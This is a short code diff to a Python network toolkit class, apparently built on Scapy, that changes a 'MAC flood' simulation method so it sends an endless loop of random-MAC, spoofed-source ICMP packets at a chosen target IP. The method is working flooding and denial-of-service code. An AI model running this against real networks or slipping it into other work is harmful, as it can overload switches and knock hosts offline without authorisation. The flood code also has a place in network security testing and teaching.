@@ -192,14 +192,15 @@ class WireBirbNetwork:
         return vendor.text
 
     # Simulating MAC flood attacks
-    def macFlood(self, interface):
+    def macFlood(self, interface, targetip):
         """ This method is for mac flooding
             
-            Usage: wrb.macFlood(interface='wlan0')
+            Usage: wrb.macFlood(interface='wlan0', targetip='192.168.1.154')
         """
         self.interface = interface
+        self.targetip = targetip
 
-        floodPacket = Ether(src=RandMAC("*:*:*:*:*:*"), dst=RandMAC("*:*:*:*:*:*"))/IP(src=RandIP("*.*.*.*"), dst=RandIP("*.*.*.*"))/ICMP()
+        floodPacket = Ether(src=RandMAC("*:*:*:*:*:*"), dst=RandMAC("*:*:*:*:*:*"))/IP(src=RandIP("*.*.*.*"), dst=self.targetip)/ICMP()
         sendp(floodPacket, iface=self.interface, loop=1)
 
     # Sniffer detection
